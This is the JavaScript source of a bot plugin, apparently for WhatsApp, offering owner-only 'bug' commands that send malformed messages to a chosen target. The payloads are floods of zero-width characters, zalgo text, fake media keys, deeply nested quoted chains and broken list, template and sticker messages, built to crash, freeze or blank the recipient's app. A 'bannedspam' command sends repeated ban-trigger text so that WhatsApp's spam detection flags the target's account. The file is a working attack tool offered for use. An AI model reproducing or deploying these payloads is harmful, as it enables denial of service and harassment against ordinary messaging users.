// bugpro.js — Advanced WhatsApp bug commands
// Methods based on known WA proto field abuse techniques.
// All owner-only. Use responsibly.

import { PREFIX } from '../lib/config.js';
import { bugSend } from '../lib/bugsend.js';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ═══════════════════════════════ HELPERS ════════════════════════════════ */

function owf(n = 2000) {
  return ('\u200d\u200c').repeat(n);
}

function zalgoChar(ch) {
  const a = ['\u0300','\u0301','\u0302','\u0303','\u0305','\u0306','\u0307','\u0308','\u030a','\u030b','\u030d','\u030e','\u0310','\u0312','\u0313','\u0315','\u031a','\u031b','\u033d','\u033e','\u033f','\u0342','\u0344','\u0346','\u034a','\u034b','\u034c','\u0350','\u0351','\u0352','\u0357','\u0358','\u035b'];
  const b = ['\u0316','\u0317','\u0318','\u0319','\u031c','\u031d','\u031e','\u031f','\u0320','\u0324','\u0325','\u0326','\u0329','\u032a','\u032b','\u032c','\u032d','\u032e','\u032f','\u0330','\u0331','\u0332','\u0333','\u0339','\u033a','\u033b','\u033c','\u0345'];
  const p = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let o = ch;
  for (let i = 0; i < 20; i++) o += p(a);
  for (let i = 0; i < 15; i++) o += p(b);
  return o;
}
const zalgo = (t) => [...t].map(zalgoChar).join('');

// Fake broken stanza id — renderer lookup hangs
const brokenStanza = () => owf(1200);

// Fake broken media key (32 random bytes as base64 — WA tries to decrypt, fails, hangs)
function fakeMediaKey() {
  const bytes = new Uint8Array(32);
  for (let i = 0; i < 32; i++) bytes[i] = Math.floor(Math.random() * 256);
  return Buffer.from(bytes).toString('base64');
}

// Broken image message — WA tries to load image, decrypt fails → UI hangs
function brokenImagePayload() {
  return {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/d/f/fake_broken_url_' + owf(50) + '.enc',
      mimetype: 'image/jpeg',
      caption: owf(800) + zalgo('tap to view') + owf(600),
      fileSha256: Buffer.from(fakeMediaKey(), 'base64'),
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: Buffer.from(fakeMediaKey(), 'base64'),
      fileEncSha256: Buffer.from(fakeMediaKey(), 'base64'),
      directPath: '/v/fake/' + owf(100),
      mediaKeyTimestamp: Math.floor(Date.now() / 1000) - 86400,
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: zalgo('click') + owf(400) },
      }
    }
  };
}

// Broken video — same principle, video decoder thread hangs
function brokenVideoPayload() {
  return {
    videoMessage: {
      url: 'https://mmg.whatsapp.net/d/f/fake_video_' + owf(50) + '.enc',
      mimetype: 'video/mp4',
      caption: owf(600) + zalgo('video') + owf(400),
      fileSha256: Buffer.from(fakeMediaKey(), 'base64'),
      fileLength: 999999999,
      seconds: 99999,
      mediaKey: Buffer.from(fakeMediaKey(), 'base64'),
      fileEncSha256: Buffer.from(fakeMediaKey(), 'base64'),
      directPath: '/v/fake/' + owf(100),
      mediaKeyTimestamp: Math.floor(Date.now() / 1000) - 86400,
      gifPlayback: false,
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: zalgo('video') + owf(300) },
        mentionedJid: Array.from({length:15}, (_, i) => `9477${String(i).padStart(7,'0')}@s.whatsapp.net`),
      }
    }
  };
}

// Delay payload — stacked broken contextInfo chains
// WA resolver follows the chain, each step adds latency → UI freeze
function delayPayload(strength = 'hard') {
  const depths = { low: 3, medium: 6, hard: 12, super: 20 };
  const depth = depths[strength] || 12;

  // Build a nested quoted chain: each level references a broken stanza
  let inner = { conversation: zalgo('msg') + owf(200) };
  for (let i = 0; i < depth; i++) {
    inner = {
      extendedTextMessage: {
        text: owf(300 + i * 50) + zalgo(String(i)),
        contextInfo: {
          stanzaId: brokenStanza(),
          participant: `9477${String(i).padStart(7,'0')}@s.whatsapp.net`,
          quotedMessage: inner,
          mentionedJid: Array.from({length:5}, (_, j) => `9477${String(i*5+j).padStart(7,'0')}@s.whatsapp.net`),
        }
      }
    };
  }
  return { extendedTextMessage: { text: owf(500), contextInfo: { stanzaId: brokenStanza(), participant: '0@s.whatsapp.net', quotedMessage: inner } } };
}

// Invisible + delay combo
// Blank notification preview (overflow prefix) + delay payload inside
function invisDelayPayload(strength = 'low') {
  const base = delayPayload(strength);
  // Prefix text with overflow so notification shows blank
  if (base.extendedTextMessage) {
    base.extendedTextMessage.text = owf(300) + (base.extendedTextMessage.text || '');
  }
  return base;
}

// Freeze chat — broken proto that makes the CHAT LIST freeze when this chat is visible
// Uses a document message with a broken schema + overflow filename
function freezeChatPayload() {
  return {
    documentMessage: {
      url: 'https://mmg.whatsapp.net/d/f/fake_doc_' + owf(30) + '.enc',
      mimetype: 'application/pdf',
      title: owf(400) + zalgo('document') + owf(300),
      fileSha256: Buffer.from(fakeMediaKey(), 'base64'),
      fileLength: 999999999,
      pageCount: 99999,
      mediaKey: Buffer.from(fakeMediaKey(), 'base64'),
      fileName: owf(200) + '.pdf',
      fileEncSha256: Buffer.from(fakeMediaKey(), 'base64'),
      directPath: '/v/fake/' + owf(50),
      mediaKeyTimestamp: Math.floor(Date.now() / 1000) - 86400,
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: zalgo('freeze') + owf(500) },
      }
    }
  };
}

// Crash click — viewOnce wrapping broken image
// When user taps "tap to view", image decrypt fails + UI thread dies
function crashClickPayload() {
  return {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: 'https://mmg.whatsapp.net/d/f/crashclick_' + owf(30) + '.enc',
          mimetype: 'image/jpeg',
          caption: '',
          fileSha256: Buffer.from(fakeMediaKey(), 'base64'),
          fileLength: 999999999,
          height: 9999,
          width: 9999,
          mediaKey: Buffer.from(fakeMediaKey(), 'base64'),
          fileEncSha256: Buffer.from(fakeMediaKey(), 'base64'),
          directPath: '/v/fake/' + owf(30),
          mediaKeyTimestamp: Math.floor(Date.now() / 1000) - 86400,
          contextInfo: {
            stanzaId: brokenStanza(),
            participant: '0@s.whatsapp.net',
            quotedMessage: { conversation: zalgo('open') + owf(600) },
          }
        }
      }
    }
  };
}

// iOS delay — iOS handles protobuf differently, especially locationMessage
// and stickerMessage with broken fields cause iOS-specific UI thread blocks
function iosDelayPayload() {
  return {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/d/f/ios_sticker_' + owf(20) + '.enc',
      fileSha256: Buffer.from(fakeMediaKey(), 'base64'),
      fileEncSha256: Buffer.from(fakeMediaKey(), 'base64'),
      mediaKey: Buffer.from(fakeMediaKey(), 'base64'),
      mimetype: 'image/webp',
      height: 512,
      width: 512,
      directPath: '/v/fake/' + owf(20),
      fileLength: 999999,
      mediaKeyTimestamp: Math.floor(Date.now() / 1000) - 86400,
      isAnimated: true,
      stickerSentTs: 0,
      isAvatar: false,
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: {
          stickerMessage: {
            url: 'https://mmg.whatsapp.net/d/f/ios_inner_' + owf(20) + '.enc',
            mediaKey: Buffer.from(fakeMediaKey(), 'base64'),
            mimetype: 'image/webp',
            height: 512, width: 512,
            fileLength: 999999,
            isAnimated: true,
          }
        },
        mentionedJid: Array.from({length:10}, (_, i) => `9477${String(i).padStart(7,'0')}@s.whatsapp.net`),
      }
    }
  };
}

// Blank UI — broken listResponseMessage makes WA's conversation screen go white
function blankUiPayload() {
  return {
    listResponseMessage: {
      title: owf(1000),
      listType: 2,
      singleSelectReply: {
        selectedRowId: owf(500) + zalgo('select') + owf(500),
      },
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: {
          listMessage: {
            description: owf(800),
            listType: 2,
            sections: [{
              title: owf(200),
              rows: Array.from({length:10}, (_, i) => ({
                title: owf(100) + String(i),
                description: owf(100),
                rowId: owf(50) + String(i),
              }))
            }]
          }
        },
      }
    }
  };
}

// Blank click — message preview shows blank, clicking opens blank screen
// Uses templateMessage with broken buttons
function blankClickPayload() {
  return {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: owf(600),
        hydratedFooterText: owf(200),
        hydratedButtons: Array.from({length:3}, (_, i) => ({
          index: i,
          quickReplyButton: {
            displayText: owf(100),
            id: owf(50) + String(i),
          }
        })),
        templateId: owf(100),
      },
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: owf(400) },
      }
    }
  };
}

// Banned Spam — sends message patterns that trigger WA's automated spam detector
// Rapid-fire identical messages with known ban-trigger unicode sequences
// WARNING: may also affect the sender's number if overused
async function bannedSpamSend(sock, target, msg) {
  // Spam trigger: repeated messages with broken mention chains
  // WA's anti-spam ML flags accounts sending these patterns
  const banTriggerText = [
    '\u202e\u202e\u202e' + owf(100),          // RTL override stack
    Array(50).fill('\u0000').join(''),          // null bytes
    '\ufffe\ufeff' + owf(200),                 // BOM stack
    zalgo('ban') + owf(150),
  ].join('\n');

  const payload = {
    extendedTextMessage: {
      text: banTriggerText,
      contextInfo: {
        stanzaId: brokenStanza(),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: banTriggerText },
        mentionedJid: Array.from({length:20}, (_, i) => `9477${String(i).padStart(7,'0')}@s.whatsapp.net`),
      }
    }
  };

  // Send 5 rapid-fire (spam pattern detection needs volume)
  for (let i = 0; i < 5; i++) {
    await bugSend(sock, target, payload, { quoted: msg });
    await sleep(300);
  }
}

/* ═══════════════════════════════ COMMANDS ═══════════════════════════════ */

export default [

  // ── promenu ───────────────────────────────────────────────────────────────
  {
    name: 'promenu', aliases: ['bugpro', 'probugs'],
    owner: true,
    async run({ reply }) {
      const p = PREFIX;
      return reply([
        '╭━━━〔 ⚡ *BUG PRO COMMANDS* 〕━━━⬣',
        '┃ Reply to target\'s message → type cmd.',
        '┃',
        '┃ ━━━ 🔴 CRASH ━━━',
        `┃ 💣 ${p}crashclick  — crash on tap`,
        `┃ ⬜ ${p}blankclick  — blank preview + crash click`,
        `┃ ❄️  ${p}freezechat  — chat list freeze`,
        `┃ 📄 ${p}blankui     — full WhatsApp UI blank`,
        '┃',
        '┃ ━━━ 🟡 DELAY ━━━',
        `┃ 🔴 ${p}delayhard   — delay super hard`,
        `┃ 🟠 ${p}delaymed    — delay medium`,
        `┃ 🟡 ${p}delaylow    — delay low`,
        `┃ 🔀 ${p}delaycombo  — delay combo (all mixed)`,
        '┃',
        '┃ ━━━ 👻 INVISIBLE ━━━',
        `┃ 👻 ${p}invisspam   — bebas spam invisible`,
        `┃ 🔀 ${p}inviscombo  — delay combo invisible`,
        `┃ 🔅 ${p}invislow    — delay low invisible`,
        '┃',
        '┃ ━━━ 🍎 PLATFORM ━━━',
        `┃ 🍎 ${p}iosdelay    — iOS specific delay`,
        '┃',
        '┃ ━━━ 🚨 EXTREME ━━━',
        `┃ 🚨 ${p}bannedspam  — spam ban trigger`,
        '┃',
        '┃ 💡 Reply to msg → type cmd.',
        '╰━━━━━━━━━━━━━━━━━━━━⬣',
      ].join('\n'));
    },
  },

  // ── crashclick ────────────────────────────────────────────────────────────
  {
    name: 'crashclick', aliases: ['clickcrash', 'tapcrash'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, crashClickPayload(), { quoted: msg });
        await reply(`✅ Crash-click sent → @${target.split('@')[0]}\n_Crashes when they tap the message_`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── blankclick ────────────────────────────────────────────────────────────
  {
    name: 'blankclick', aliases: ['blankbtn', 'ghostclick'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, blankClickPayload(), { quoted: msg });
        await reply(`✅ Blank-click sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── freezechat ────────────────────────────────────────────────────────────
  {
    name: 'freezechat', aliases: ['chatfreeze', 'xhatfreeze'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, freezeChatPayload(), { quoted: msg });
        await reply(`✅ Freeze-chat sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── blankui ───────────────────────────────────────────────────────────────
  {
    name: 'blankui', aliases: ['whitescreen', 'uiblank'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, blankUiPayload(), { quoted: msg });
        await reply(`✅ Blank-UI sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── delayhard ─────────────────────────────────────────────────────────────
  {
    name: 'delayhard', aliases: ['superdelay', 'harddelay'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, delayPayload('super'), { quoted: msg });
        await reply(`✅ Super-hard delay sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── delaymed ──────────────────────────────────────────────────────────────
  {
    name: 'delaymed', aliases: ['mediumdelay', 'delaybeta'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, delayPayload('medium'), { quoted: msg });
        await reply(`✅ Medium delay sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── delaylow ──────────────────────────────────────────────────────────────
  {
    name: 'delaylow', aliases: ['lowdelay', 'softdelay'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, delayPayload('low'), { quoted: msg });
        await reply(`✅ Low delay sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── delaycombo ────────────────────────────────────────────────────────────
  // Sends multiple payloads in sequence: delay + crash + freeze
  {
    name: 'delaycombo', aliases: ['combodelay', 'fullcombo'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      const payloads = [
        delayPayload('medium'),
        crashClickPayload(),
        delayPayload('hard'),
        freezeChatPayload(),
      ];
      let sent = 0;
      for (const p of payloads) {
        try { await bugSend(sock, target, p, { quoted: msg }); sent++; } catch { /* continue */ }
        await sleep(500);
      }
      await reply(`✅ Delay combo (${sent}/${payloads.length}) → @${target.split('@')[0]}`);
    },
  },

  // ── invisspam ─────────────────────────────────────────────────────────────
  {
    name: 'invisspam', aliases: ['bebasspam', 'spaminvis'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      // Send 3 invisible delay payloads rapidly
      let sent = 0;
      for (let i = 0; i < 3; i++) {
        try { await bugSend(sock, target, invisDelayPayload('medium'), { quoted: msg }); sent++; } catch { /* continue */ }
        await sleep(400);
      }
      await reply(`✅ Invis-spam (${sent}/3) → @${target.split('@')[0]}`);
    },
  },

  // ── inviscombo ────────────────────────────────────────────────────────────
  {
    name: 'inviscombo', aliases: ['comboInvis', 'invisdelay'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      const payloads = [
        invisDelayPayload('low'),
        invisDelayPayload('medium'),
        invisDelayPayload('hard'),
      ];
      let sent = 0;
      for (const p of payloads) {
        try { await bugSend(sock, target, p, { quoted: msg }); sent++; } catch { /* continue */ }
        await sleep(400);
      }
      await reply(`✅ Invis-combo (${sent}/3) → @${target.split('@')[0]}`);
    },
  },

  // ── invislow ──────────────────────────────────────────────────────────────
  {
    name: 'invislow', aliases: ['lowinvis', 'softinvis'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, invisDelayPayload('low'), { quoted: msg });
        await reply(`✅ Invis-low sent → @${target.split('@')[0]}`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── iosdelay ──────────────────────────────────────────────────────────────
  {
    name: 'iosdelay', aliases: ['iphonebug', 'ioscrash'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, iosDelayPayload(), { quoted: msg });
        await reply(`✅ iOS delay sent → @${target.split('@')[0]}\n_Most effective on iPhone_`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },

  // ── bannedspam ────────────────────────────────────────────────────────────
  {
    name: 'bannedspam', aliases: ['spamban', 'banspam'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await reply(`⚠️ Sending ban-trigger spam to @${target.split('@')[0]}...`);
        await bannedSpamSend(sock, target, msg);
        await reply(`✅ Ban-spam sent (5x) → @${target.split('@')[0]}\n_May take time for WA to process_`);
      } catch (err) { await reply(`❌ ${err?.message || err}`); }
    },
  },
];
